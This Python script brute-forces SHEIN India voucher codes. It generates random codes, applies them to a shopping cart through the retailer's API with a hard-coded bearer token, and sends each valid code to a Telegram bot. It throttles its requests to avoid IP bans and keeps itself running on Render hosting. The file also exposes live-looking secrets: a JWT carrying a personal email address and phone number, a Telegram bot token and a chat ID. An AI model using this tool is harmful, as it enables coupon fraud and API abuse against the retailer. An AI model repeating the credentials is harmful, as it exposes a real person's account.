import requests
import random
import string
import time
import threading
import json
import os
from http.server import BaseHTTPRequestHandler, HTTPServer

# --- CONFIGURATION ---
# Updated with your new Access Token
ACCESS_TOKEN = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzaGVpbl9za3JhbWFuYW45MDFAZ21haWwuY29tIiwicGtJZCI6ImY0OWViMjkxLTBiYWQtNGFiOS04NzBmLTQwN2U2MjYyM2ZmNyIsImNsaWVudE5hbWUiOiJ0cnVzdGVkX2NsaWVudCIsInJvbGVzIjpbeyJuYW1lIjoiUk9MRV9DVVNUT01FUkdST1VQIn1dLCJtb2JpbGUiOiI5MzQyODYwNDAxIiwidGVuYW50SWQiOiJTSEVJTiIsImV4cCI6MTc3MTc3MjA5NiwidXVpZCI6ImY0OWViMjkxLTBiYWQtNGFiOS04NzBmLTQwN2U2MjYyM2ZmNyIsImlhdCI6MTc2OTE4MDA5NiwiZW1haWwiOiJza3JhbWFuYW45MDFAZ21haWwuY29tIn0.vM9ZbfFqpID4m08zs3OfTk9IImUcgc6nopFzpWKz9W_QSL5QhWLgeQjJsNAdKvdz6rERx7HV1yYChMOVIeA-eCYXwjlnHWDHmT3p-msVNjV1YL03uJTFA9hvSAa35SsKCYdKPC-DpjiUhSlMLA-K9PudKWQ0MwPydhGth01GK4EmxDR2TitWKXc2c6KggOP3_de5DCJklq6lyWHyhvYneW8Y84A8Iy7OAzXFD_J28fgZ9GUPyk8tFU8Mw4JfMXO-8bxtlNJcMcfVuYGW0qDt_JrNclNvbOx6jN1K5c3Bun_YFqREBqK05x0CUbZI3xNpy0wW3Qeu0R-dkESRa4VMhw"

CART_ID = "SH6740706850"
EMAIL = "skramanan901@gmail.com"
BASE_URL = f"https://api.sheinindia.in/rilfnlwebservices/v2/rilfnl/users/{EMAIL}/carts/{CART_ID}/vouchers"

TG_TOKEN = "8090670882:AAEQVAZF9TPEpjeuHWOOxm41uUBIwhcRCfk"
TG_CHAT_ID = "1827265590"

# Lock to keep logs clean
log_lock = threading.Lock()

def send_to_telegram(code, status):
    """Sends ONLY successful hits to Telegram"""
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
    msg = f"✅ *COUPON HIT!*\n\n*Code:* `{code}`\n*Status:* {status}\n*Account:* {EMAIL}"
    try:
        requests.post(url, json={"chat_id": TG_CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    except:
        pass

def generate_random_code():
    """Generates SVI, SVD, or SVH formats (15 chars)"""
    mode = random.choice(["SVI", "SVD", "SVH"])
    chars = string.ascii_uppercase + string.digits
    if mode == "SVI":
        return "SVI" + random.choice(["0", "1"]) + ''.join(random.choice(chars) for _ in range(11))
    else:
        return mode + ''.join(random.choice(chars) for _ in range(12))

def checker_loop():
    print("--- Checker Started (No Proxies) ---", flush=True)
    while True:
        code = generate_random_code()
        headers = {
            "Authorization": f"Bearer {ACCESS_TOKEN}",
            "RequestId": "ApplyCoupon",
            "X-Tenant": "B2C",
            "X-TENANT-ID": "SHEIN",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Android"
        }
        
        try:
            # Direct request without proxies
            response = requests.post(BASE_URL, headers=headers, data={"voucherId": code, "employeeOfferRestriction": "true"}, timeout=15)
            
            # --- SHOW ALL RESPONSES IN RENDER LOGS ---
            with log_lock:
                print(f"\n[CHECKING: {code}]", flush=True)
                print(f"HTTP Status: {response.status_code}", flush=True)
                try:
                    # Print full JSON body
                    print(json.dumps(response.json(), indent=2), flush=True)
                except:
                    print(f"Body: {response.text}", flush=True)
                print("-" * 40, flush=True)

            # --- HANDLE HITS ---
            if response.status_code in [200, 201]:
                send_to_telegram(code, response.status_code)
                # Remove it so we can keep checking
                requests.delete(f"{BASE_URL}/{code}", headers=headers)
            
            elif response.status_code == 401:
                print("!!! ALERT: ACCESS TOKEN EXPIRED !!!", flush=True)
                break # Stops the bot if the token dies

        except Exception as e:
            print(f"Request Error: {e}", flush=True)
        
        # Sleep to avoid instant IP ban
        time.sleep(2.0)

# --- RENDER HEALTH CHECK SERVER ---
class RenderServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is active")

def run_web_server():
    # Render binds the port to the environment variable PORT
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(('0.0.0.0', port), RenderServer)
    print(f"Health server live on port {port}. Satisfying Render port-binding.", flush=True)
    server.serve_forever()

if __name__ == "__main__":
    # Start checking in the background
    threading.Thread(target=checker_loop, daemon=True).start()
    
    # Start the web server in the foreground (Required by Render)
    run_web_server()
